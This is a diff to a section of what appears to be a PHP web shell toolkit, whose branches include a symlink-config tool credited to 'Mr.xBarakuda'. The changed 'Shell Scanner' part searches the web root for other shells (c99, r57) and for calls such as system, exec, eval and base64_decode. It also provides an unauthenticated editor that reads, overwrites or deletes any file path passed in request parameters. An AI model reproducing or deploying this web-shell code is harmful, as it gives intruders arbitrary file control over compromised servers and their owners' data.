@@ -3924,7 +3924,7 @@ elseif ($_GET['do'] == 'hashid') {
         </center>
         <?php
     }
-elseif ($_GET['do'] == 'shellscan') { // Update code
+elseif ($_GET['do'] == 'shellscan') {
     ?>
     <script type="text/javascript">
         function MM_openBrWindow(c, a, b) {
@@ -3932,137 +3932,121 @@ elseif ($_GET['do'] == 'shellscan') { // Update code
         }
     </script>
     <style type="text/css">
-        .single {
-            border: 1px solid #00ff00;
-            box-shadow: 0px 0px 15px #55FF55;
-            padding: 5px;
-        }
-        .me {
-            font-size: 12px;
-            font-family: Iceland;
-            color: #ccff99;
-            border: 0px;
-            padding: 3px;
-        }
-        .isi {
-            padding: 2px;
-            border: 1px solid #666666;
-            font-family: Iceland;
-            color: #ccff99;
-            background-color: #666666;
-            font-size: 10px;
-            font-weight: bold;
-        }
-        #patch {
-            position: absolute;
-            height: 1px;
-            width: 1px;
-            top: 0;
-            left: 0;
-        }
+        .single { border: 1px solid #00ff00; box-shadow: 0px 0px 15px #55FF55; padding: 5px; }
+        .me { font-size: 12px; font-family: Iceland; color: #ccff99; border: 0px; padding: 3px; }
+        .isi { padding: 2px; border: 1px solid #666666; font-family: Iceland; color: #ccff99; background-color: #666666; font-size: 10px; font-weight: bold; }
+        #patch { position: absolute; height: 1px; width: 1px; top: 0; left: 0; }
     </style>
     </head>
     <body>
-        <center>
-            <h3 style="color: white;">Shell Scanner</h3>
-        </center>
-        <?php
-        if (isset($_REQUEST['edit']) && $_REQUEST['edit'] == 'file') {
-            $filename = $_GET['file'] ?? '';
-            if (isset($_POST['yes'])) {
-                if (file_exists($filename)) {
-                    unlink($filename);
-                    echo "<br><br><br><font color=red size=3><b><center>{$filename} deleted...</b></font><br><br><br><br><br><br><br>";
-                } else {
-                    echo "<br><br><br><font color=red size=3><b><center>{$filename} does not exist...</b></font><br><br><br><br><br><br><br>";
-                }
-                echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
-            } else {
-                if ($_POST['update']) {
-                    $filename = $_POST['file'] ?? '';
-                    $content = $_POST['content'] ?? '';
-                    if (is_writable($filename)) {
-                        $handle = fopen($filename, "w+");
-                        fwrite($handle, stripslashes($content));
-                        fclose($handle);
-                        $stat = "<center><strong>edited successfully<br></strong></center>";
-                    } else {
-                        $stat = "<center><font color=red><strong>Error! File may not be writable.</strong></font></center>";
-                    }
-                }
-                if ($_POST['close']) {
-                    echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
-                }
-                if (file_exists($filename)) {
-                    $vuln = $_GET['bug'] ?? '';
-                    $handle = fopen($filename, "r");
-                    $contents = fread($handle, filesize($filename));
+    <center>
+        <h3 style="color: white;">Shell Scanner</h3>
+    </center>
+    <?php
+    if (isset($_REQUEST['edit']) && $_REQUEST['edit'] == 'file') {
+        if (isset($_POST['yes'])) {
+            $filename = $_GET['file'];
+            echo "<br><br><br><font color=red size=3><b><center>" . htmlspecialchars($filename) . " deleted...</b></font><br><br><br><br><br><br><br>";
+            @unlink($filename);
+            echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
+        } else {
+            $stat = "";
+            if (isset($_POST['update'])) {
+                $filename = $_POST['file'];
+                if (is_writable($filename)) {
+                    $handle = fopen($filename, "w+");
+                    $isi = $_POST['content'];
+                    fwrite($handle, stripslashes($isi));
                     fclose($handle);
-                    ?>
-                    <center>
+                    $stat = "<center><strong>edited successfully<br>";
+                } else {
+                    $stat = "<center><font color=red><strong>Error! File may not be writable.</font></center>";
+                }
+            }
+            if (isset($_POST['close'])) {
+                echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
+            }
+            $filename = $_GET['file'];
+            if (file_exists($filename)) {
+                $vuln = $_GET['bug'];
+                $contents = file_get_contents($filename);
+                ?>
+                <center>
+                    <form method="post" action="">
                         <table>
                             <tr>
-                                <td align="left" class="me"><strong><?= htmlspecialchars($filename) ?> &nbsp;&nbsp;>> Contains: &nbsp;<?= htmlspecialchars($vuln) ?></strong></td>
-                            </tr>
-                            <tr>
-                                <td class="me">
-                                    <form method="post" action="">
-                                        <input type="hidden" name="file" value="<?= htmlspecialchars($filename) ?>">
-                                        <textarea name="content" cols="60" rows="15"><?= htmlspecialchars($contents) ?></textarea>
-                                        <br>
-                            </td>
-                            </tr>
-                            <tr>
-                                <td align="center" class="me">
-                                    <?php if (isset($_POST['delete'])) { ?>
-                                        <p>Are you sure to delete <?= htmlspecialchars($filename) ?>?</p>
-                                        <input type="submit" name="yes" value="Y E S">
-                                        <input type="submit" name="no" value="N O">
-                                    <?php } else { ?>
-                                        <?= $stat ?? '' ?>
-                                    <?php } ?>
+                                <td align="left" class="me">
+                                    <strong><?= htmlspecialchars($filename) ?>&nbsp;&nbsp;>> Contains :&nbsp;<?= htmlspecialchars($vuln) ?></strong>
                                 </td>
                             </tr>
                             <tr>
-                                <td align="right" class="me">
-                                    <input type="submit" name="close" value="C l o s e">
-                                    <input type="submit" name="delete" value="D e l e t e">
-                                    <input type="submit" name="update" value="S a v e">
+                                <td class="me">
+                                    <input type="hidden" name="file" value="<?= htmlspecialchars($filename) ?>">
+                                    <textarea name="content" cols="60" rows="15"><?= htmlspecialchars($contents) ?></textarea>
+                                    <br>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td align="center" class="me">
+                                    <?php
+                                    if (isset($_POST['delete'])) {
+                                        echo "Are you sure to delete " . htmlspecialchars($filename) . " ?";
+                                        ?>
+                                        <tr>
+                                            <td align="center" class="me">
+                                                <input type="submit" name="yes" value=" Y E S ">
+                                                <input type="submit" name="no" value=" N O ">
+                                            </td>
+                                        </tr>
+                                        <?php
+                                    } else {
+                                        echo $stat;
+                                        ?>
+                                        <tr>
+                                            <td align="right" class="me">
+                                                <input type="submit" name="close" value=" C l o s e ">
+                                                <input type="submit" name="delete" value=" D e l e t e ">
+                                                <input type="submit" name="update" value=" S a v e ">
+                                            </td>
+                                        </tr>
+                                        <?php
+                                    }
+                                    ?>
                                 </td>
                             </tr>
                         </table>
                     </form>
-                    </center>
-                    <?php
-                } else {
-                    echo "<br><br><br><font color=red size=3><b><center>{$filename} not exist...</center></b></font><br><br><br><br><br><br><br>";
-                    echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
-                }
+                </center>
+                <?php
+            } else {
+                echo "<br><br><br><font color=red size=3><b><center>" . htmlspecialchars($filename) . " not exist...</b></font><br><br><br><br><br><br><br>";
+                echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
             }
-        } elseif (isset($_POST['Submit'])) {
-            // Parameter cek
-            $cek_params = array('base64_decode', 'system', 'passthru', 'popen', 'exec', 'shell_exec', 'eval', 'move_uploaded_file');
-
-            $ceks = array();
-            foreach ($cek_params as $param) {
-                if (!empty($_POST[$param])) {
-                    $ceks[] = $_POST[$param];
-                }
+        }
+    } elseif (isset($_POST['Submit'])) {
+        $ceks = array('base64_decode', 'system', 'passthru', 'popen', 'exec', 'shell_exec', 'eval', 'move_uploaded_file');
+        $six = "";
+        foreach ($ceks as $ceker) {
+            if (isset($_POST[$ceker]) && $_POST[$ceker] <> "") {
+                $six .= $_POST[$ceker] . ".";
             }
-            $six = implode('.', $ceks);
-            $cek = explode('.', $six);
+        }
+        $cek = explode('.', rtrim($six, '.'));
 
-            // Fungsi untuk listing file
-            function ListFiles($dir = '.') {
+        if (!function_exists('ListFiles')) {
+            function ListFiles($dir) {
                 $files = array();
-                if (is_dir($dir) && ($dh = opendir($dir))) {
+                if ($dh = @opendir($dir)) {
                     while (($file = readdir($dh)) !== false) {
-                        if ($file != '.' && $file != '..') {
-                            $fullPath = $dir . '/' . $file;
-                            if (is_dir($fullPath)) {
-                                $files = array_merge($files, ListFiles($fullPath));
+                        if ($file != "." && $file != "..") {
+                            $path = $dir . "/" . $file;
+                            if (is_dir($path)) {
+                                $inner_files = ListFiles($path);
+                                if (is_array($inner_files)) {
+                                    $files = array_merge($files, $inner_files);
+                                }
                             } else {
-                                $files[] = $fullPath;
+                                $files[] = $path;
                             }
                         }
                     }
@@ -4070,120 +4054,188 @@ elseif ($_GET['do'] == 'shellscan') { // Update code
                 }
                 return $files;
             }
-
-            echo '<center><table border="0" width="90%" cellpadding="5" style="border-collapse: collapse;">';
-            echo '<tr style="background-color:#eee;">
-                    <th>No</th>
-                    <th>Type</th>
-                    <th>File Location</th>
-                    <th>Last Edit</th>
-                    <th>File Size</th>
-                </tr>';
-
-            $target = $_SERVER['DOCUMENT_ROOT'];
-            $files = ListFiles($target);
-            $i = 0; // counter utama
-            $x = 0; // counter file tidak ada
-
-            foreach ($files as $file) {
-                if (substr($file, -4) === ".php") {
-                    if ($file !== $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF']) {
-                        $content = @file_get_contents($file);
-                        if ($content === false) continue; // gagal baca file
-
-                        $op = strtolower($content);
+        }
+        ?>
+        <center>
+            <table border="0" width="90%" cellpadding="5">
+                <tr>
+                    <td class="me" align="right" width="30"><b>No</b></td>
+                    <td class="me" align="center" width="105"><b>Type</b></td>
+                    <td class="me" align="center"><b>File Location</b></td>
+                    <td class="me" align="center" width="150"><b>Last Edit</b></td>
+                    <td class="me" align="right" width="80"><b>File Size</b></td>
+                </tr>
+                <?php
+                $target = $_SERVER['DOCUMENT_ROOT'];
+                $i = 0;
+                foreach (ListFiles($target) as $file) {
+                    $nFile = substr($file, -4);
+                    if ($nFile == ".php") {
+                        if ($file == $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF']) continue;
+                        
+                        $ops = @file_get_contents($file);
+                        if (!$ops) continue;
+                        
+                        $op = strtolower($ops);
                         $arr = array('c99_buff_prepare' => 'c 9 9', 'abcr57' => 'r 5 7');
                         $sis = 0;
                         $size = filesize($file);
-                        $last_modified = filemtime($file);
-                        $last = date("M-d-Y H:i", $last_modified);
-
-                        // Deteksi signature signature tertentu
+                        $last = date("M-d-Y H:i", filemtime($file));
+                        
                         foreach ($arr as $key => $val) {
-                            if (strpos($op, $key) !== false) {
+                            if (@preg_match("/$key/", $op)) {
                                 $sis = 1;
                                 $i++;
-                                echo "<tr style='background-color:#fdd;' onMouseOver='this.style.backgroundColor=\"#ccc\"' onMouseOut='this.style.backgroundColor=\"\"'>";
-                                echo "<td align='right'>{$i}</td>";
-                                echo "<td><font color='red'>{$val}</font></td>";
-                                echo "<td><a href='#' onclick=\"MM_openBrWindow('?edit=file&file=" . urlencode($file) . "&bug={$val}', 'File view', 'status=yes,scrollbars=yes,width=700,height=600')\">" . htmlspecialchars($file) . "</a></td>";
-                                echo "<td>{$last} GMT+9</td>";
-                                echo "<td>{$size} bytes</td>";
-                                echo "</tr>";
+                                ?>
+                                <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
+                                    <td align="right"><font color="red"><blink><?= $i ?></blink></font></td>
+                                    <td align="center"><font color="red"><blink><?= $val ?></blink></font></td>
+                                    <td align="left">
+                                        <blink>
+                                            <a href="#" class="abunai" onClick="MM_openBrWindow('?edit=file&file=<?= urlencode($file) ?>&bug=<?= urlencode($val) ?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?= htmlspecialchars($file) ?></a>
+                                        </blink>
+                                    </td>
+                                    <td align="center"><font color="red"><blink><?= $last ?> GMT+9</blink></font></td>
+                                    <td align="right"><font color="red"><blink><?= $size ?> byte</blink></font></td>
+                                </tr>
+                                <?php
+                                break;
                             }
                         }
-
-                        // Deteksi fungsi sistem tersembunyi
-                        if ($sis != 1) {
+                        
+                        if ($sis == 0) {
                             if (preg_match("/system\((.*?)\)/", $op) && preg_match("/<pre>/", $op) && preg_match("/empty\((.*?)\)/", $op)) {
                                 $sis = 2;
                                 $i++;
-                                echo "<tr style='background-color:#fdd;' onMouseOver='this.style.backgroundColor=\"#ccc\"' onMouseOut='this.style.backgroundColor=\"\"'>";
-                                echo "<td align='right'>{$i}</td>";
-                                echo "<td><font color='#A0CE4E'>hidden shell</font></td>";
-                                echo "<td><a href='#' onclick=\"MM_openBrWindow('?edit=file&file=" . urlencode($file) . "&bug=hidden_shell', 'File view', 'status=yes,scrollbars=yes,width=700,height=600')\">" . htmlspecialchars($file) . "</a></td>";
-                                echo "<td>{$last} GMT+9</td>";
-                                echo "<td>{$size} bytes</td>";
-                                echo "</tr>";
+                                $val = "hidden shell";
+                                ?>
+                                <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
+                                    <td align="right"><font color="#A0CE4E"><?= $i ?></font></td>
+                                    <td align="center"><font color="#A0CE4E"><?= $val ?></font></td>
+                                    <td align="left">
+                                        <a href="#" class="xxx" onClick="MM_openBrWindow('?edit=file&file=<?= urlencode($file) ?>&bug=<?= urlencode($val) ?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?= htmlspecialchars($file) ?></a>
+                                    </td>
+                                    <td align="center"><font color="#A0CE4E"><?= $last ?> GMT+9</font></td>
+                                    <td align="right"><font color="#A0CE4E"><?= $size ?> byte</font></td>
+                                </tr>
+                                <?php
                             }
                         }
-
-                        // Jika tidak ada signature
+                        
                         if ($sis == 0) {
                             foreach ($cek as $bugs) {
-                                if (!empty($bugs) && strpos($op, $bugs) !== false) {
+                                if ($bugs != "" && preg_match("/$bugs\((.*?)\)/", $op)) {
                                     $i++;
-                                    echo "<tr style='background-color:#fdd;' onMouseOver='this.style.backgroundColor=\"#ccc\"' onMouseOut='this.style.backgroundColor=\"\"'>";
-                                    echo "<td align='right'>{$i}</td>";
-                                    echo "<td>" . htmlspecialchars($bugs) . "</td>";
-                                    echo "<td><a href='#' onclick=\"MM_openBrWindow('?edit=file&file=" . urlencode($file) . "&bug=" . urlencode($bugs) . "', 'File view', 'status=yes,scrollbars=yes,width=700,height=600')\">" . htmlspecialchars($file) . "</a></td>";
-                                    echo "<td>{$last} GMT+9</td>";
-                                    echo "<td>{$size} bytes</td>";
-                                    echo "</tr>";
+                                    ?>
+                                    <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
+                                        <td align="right"><?= $i ?></td>
+                                        <td align="center"><?= htmlspecialchars($bugs) ?></td>
+                                        <td align="left">
+                                            <a href="#" onClick="MM_openBrWindow('?edit=file&file=<?= urlencode($file) ?>&bug=<?= urlencode($bugs) ?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?= htmlspecialchars($file) ?></a>
+                                        </td>
+                                        <td align="center"><?= $last ?> GMT+9</td>
+                                        <td align="right"><?= $size ?> byte</td>
+                                    </tr>
+                                    <?php
+                                    break;
                                 }
                             }
                         }
-
-                        // Pencarian teks
-                        if (!empty($_POST['textV'])) {
+                        
+                        if (isset($_POST['textV']) && $_POST['textV'] != "") {
                             $text = $_POST['textV'];
-                            if (strpos($op, $text) !== false) {
+                            if (preg_match("/" . preg_quote($text, '/') . "/", $op)) {
                                 $i++;
-                                echo "<tr style='background-color:#fdd;' onMouseOver='this.style.backgroundColor=\"#ccc\"' onMouseOut='this.style.backgroundColor=\"\"'>";
-                                echo "<td align='right'>{$i}</td>";
-                                echo "<td>" . htmlspecialchars($text) . "</td>";
-                                echo "<td><a href='#' onclick=\"MM_openBrWindow('?edit=file&file=" . urlencode($file) . "&bug=" . urlencode($text) . "', 'File view', 'status=yes,scrollbars=yes,width=700,height=600')\">" . htmlspecialchars($file) . "</a></td>";
-                                echo "<td>{$last} GMT+9</td>";
-                                echo "<td>{$size} bytes</td>";
-                                echo "</tr>";
+                                ?>
+                                <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
+                                    <td align="right"><?= $i ?></td>
+                                    <td align="center"><?= htmlspecialchars($text) ?></td>
+                                    <td align="left">
+                                        <a href="#" onClick="MM_openBrWindow('?edit=file&file=<?= urlencode($file) ?>&bug=<?= urlencode($text) ?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?= htmlspecialchars($file) ?></a>
+                                    </td>
+                                    <td align="center"><?= $last ?> GMT+9</td>
+                                    <td align="right"><?= $size ?> byte</td>
+                                </tr>
+                                <?php
                             }
                         }
                     }
                 }
-            }
-
-            // Jika tidak ada hasil
-            if ($i == 0) {
-                foreach ($files as $file) {
-                    if (substr($file, -4) === ".php") {
-                        $x++;
-                        $size = filesize($file);
-                        $last = date("M-d-Y H:i", filemtime($file));
-                        echo "<tr style='background-color:#fff;' onMouseOver='this.style.backgroundColor=\"#eee\"' onMouseOut='this.style.backgroundColor=\"\"'>";
-                        echo "<td align='right'>{$x}</td>";
-                        echo "<td>" . htmlspecialchars($file) . "</td>";
-                        echo "<td>not exist</td>";
-                        echo "<td>no record</td>";
-                        echo "<td>- bytes</td>";
-                        echo "</tr>";
+                
+                if ($i == 0) {
+                    $x = 0;
+                    foreach ($cek as $bugs) {
+                        if ($bugs != "") {
+                            $x++;
+                            ?>
+                            <tr onMouseOver="this.style.backgroundColor='#444444'" onmouseout="this.style.backgroundColor='transparent'">
+                                <td align="right"><?= $x ?></td>
+                                <td align="center"><?= htmlspecialchars($bugs) ?></td>
+                                <td align="center"> not exist </td>
+                                <td align="center"> no record </td>
+                                <td align="right"> -&nbsp;&nbsp;&nbsp;&nbsp;byte </td>
+                            </tr>
+                            <?php
+                        }
                     }
                 }
-            }
-
-            echo '</table></center>';
-        }
+                ?>
+            </table>
+        </center>
+        <?php
+    } else {
+        $find = array('default', 'base64_decode', 'system', 'passthru', 'popen', 'exec', 'shell_exec', 'eval', 'move_uploaded_file');
         ?>
-    <?php
+        <form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
+            <center>
+                <table class="single" width="400" border="1" cellpadding="10">
+                    <tr>
+                        <td class="me">
+                            <center>
+                                <b>S e l e c t &nbsp;&nbsp;S c a n&nbsp;&nbsp;T y p e :</b><br>
+                                <table class="me" width="200">
+                                    <tr>
+                                        <td class="me">
+                                            <script language="javascript">
+                                                var master = 0;
+                                                function cekKlik() {
+                                                    var textV = document.getElementById('textV');
+                                                    var cekV = document.getElementById('cekV');
+                                                    textV.disabled = !cekV.checked;
+                                                    updateSubmit();
+                                                }
+                                                function checkValue(checkbox) {
+                                                    if (checkbox.checked) master++;
+                                                    else if (master > 0) master--;
+                                                    updateSubmit();
+                                                }
+                                                function updateSubmit() {
+                                                    document.fCheck.Submit.disabled = (master === 0);
+                                                }
+                                            </script>
+                                            <?php
+                                            foreach ($find as $bug) {
+                                                ?>
+                                                <input onClick="checkValue(this)" name="<?= htmlspecialchars($bug) ?>" type="checkbox" id="<?= htmlspecialchars($bug) ?>" value="<?= htmlspecialchars($bug) ?>" />&nbsp;<?= htmlspecialchars($bug) ?><br>
+                                                <?php
+                                            }
+                                            ?>
+                                            <input name="cekV" type="checkbox" onClick="cekKlik()" id="cekV" value="cekV">
+                                            <input class="isi" disabled="disabled" name="textV" value="other key word" onFocus="this.select()" type="text" id="textV">
+                                            <br><br>
+                                            <input type="hidden" name="asal" value="abcd">
+                                            <input disabled="disabled" type="submit" name="Submit" value=" S t a r t&nbsp;&nbsp;S c a n " />
+                                        </td>
+                                    </tr>
+                                </table>
+                            </center>
+                        </td>
+                    </tr>
+                </table>
+            </center>
+        </form>
+        <?php
+    }
 }
 elseif ($_GET['do'] == 'symconfv2') { ?>
     <center><h3>Symlink Config v2 By Mr.xBarakuda</h3></center>
